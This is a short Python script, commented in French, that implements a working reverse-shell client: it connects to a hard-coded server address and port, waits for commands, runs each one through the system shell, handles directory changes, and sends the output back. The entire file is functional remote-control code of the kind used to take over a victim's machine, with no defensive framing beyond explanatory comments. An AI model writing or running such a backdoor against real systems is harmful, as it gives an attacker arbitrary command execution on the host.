import os  #interagir avec l'OS
import socket
import subprocess  #aussi pour controler le système d'exploitation

sock = socket.socket()
host = '192.168.1.12' #IP du serveur
port = 9999 #Port du serveur

sock.connect((host, port)) #connexion

while True: #boucle infinie pour écouter en permanence pour des instructions
    data = sock.recv(1024)  #données qu'il reçoit du serveur
    if data[:2].decode("utf-8") == 'cd':  #check si les deux premier caractères sont égal à "cd"
        os.chdir(data[3:].decode("utf-8")) #changé de répertoire grâce à os.chdir
    if len(data) > 0: #être certain qu'il y a bien des données reçue de la part du serveur
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        # ouvre une tâche + options de sortie, d'entrée, ...
        output_bytes = cmd.stdout.read() + cmd.stderr.read() #sortie au format byte
        output_str = str(output_bytes, "utf-8") # sortie au format string
        sock.send(str.encode(output_str + str(os.getcwd()) + '> ')) # envoie du résultat
        print(output_str) # affichage du résultat côté client


# Fermer la connection
sock.close() #fermeture du socket
